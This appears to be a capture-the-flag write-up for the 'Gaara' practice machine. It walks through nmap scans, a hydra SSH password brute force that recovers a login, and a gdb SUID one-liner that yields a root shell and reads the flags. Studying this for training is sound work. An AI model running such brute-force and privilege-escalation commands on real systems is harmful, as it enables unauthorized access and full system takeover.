# IP: 192.168.114.142


# NMAP

```javascript
┌──(dx㉿kali)-[~]
└─$ nmap 192.168.114.142                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 00:33 EDT
Nmap scan report for 192.168.114.142
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.38 seconds

```


# NMAP-ADVANCED
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 192.168.114.142
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 00:34 EDT
Nmap scan report for 192.168.114.142
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
                                                             
```
# NAVIGATING TO PORT-80
![GAARA-PROVING-GROUND](https://user-images.githubusercontent.com/98345027/188297672-969c1f93-13eb-4bf4-8769-0846591e6f52.png)

## Source-Page

![gara-sourcepage-proving-ground](https://user-images.githubusercontent.com/98345027/188297913-055bb220-b7c9-45b0-9e8c-3c007b62e8a5.png)

# FINDINGS-PORT:80
```javascript
1. Nothing found on the webpage and in source page just a simple image
2. It seems that username is "gaara"
```


# Exploitation

## SSH-Brute Force

```javascript
Note: 
1. Since the Port 80 doesn't provide enough information, the only logical guess we can make about  a potential SSH username is gaara
2. Let brute force the password of ssh from the wordlist(/usr/share/wordlists/metasploit/unix_passwords.txt) using hydra tool
```

```javascript
                                                                              
┌──(dx㉿kali)-[~]
└─$ sudo  hydra -l  gaara -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.114.142 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-04 01:08:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
[DATA] attacking ssh://192.168.114.142:22/
[STATUS] 111.00 tries/min, 111 tries in 00:01h, 900 to do in 00:09h, 14 active
[22][ssh] host: 192.168.114.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-04 01:10:16
```
###  FINDINGS-PORT:21

```javascript
1. For username gaara we found the password: iloveyou2
```
### SSH 

```javascript
┌──(dx㉿kali)-[~]
└─$ ssh gaara@192.168.114.142
gaara@192.168.114.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  4 01:16:01 2022 from 192.168.49.114
gaara@Gaara:~$ id
uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
gaara@Gaara:~$ whoami
gaara
gaara@Gaara:~$ 
```
## User Flag
```javascript
gaara@Gaara:~$ ls -la
total 32
drwxr-xr-x 2 gaara gaara 4096 Apr 27  2021 .
drwxr-xr-x 3 root  root  4096 Dec 13  2020 ..
lrwxrwxrwx 1 root  root     9 Mar 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 gaara gaara  220 Dec 13  2020 .bash_logout
-rw-r--r-- 1 gaara gaara 3526 Dec 13  2020 .bashrc
-rw-r--r-- 1 gaara gaara   32 Apr 27  2021 flag.txt
-rw-r--r-- 1 gaara gaara   33 Sep  4 00:31 local.txt
-rw-r--r-- 1 gaara gaara  807 Dec 13  2020 .profile
-rw------- 1 gaara gaara  102 Dec 13  2020 .Xauthority
gaara@Gaara:~$ cat local.txt
5568b7aea391766039b2fa05c175b01b
```

## Escalation

### SUID Abuse
```javascript
Note: We will start local enumeration by checking which binaries on the system have the SUID bit set.
=======================================================================================================
gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```
## Note
```javascript
1.  (/usr/bin/gdb) show the SUID bit  from GFTobins(https://gtfobins.github.io/gtfobins/gdb/#suid) among the rest of the result 
2.  Since gdb is already present in /usr/bin/gdb.
3.  So From the GFToBins we have change the "./gdb" ----> "/usr/bin/gdb" by the following code

```
## Root
```javascript
gaara@Gaara:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh","-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# id
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
# whoami
root
# cd /root
# ls
proof.txt  root.txt
# cat proof.txt
bbf7c2e1b3053ec2ffd916d9d4ffb976
# 



```






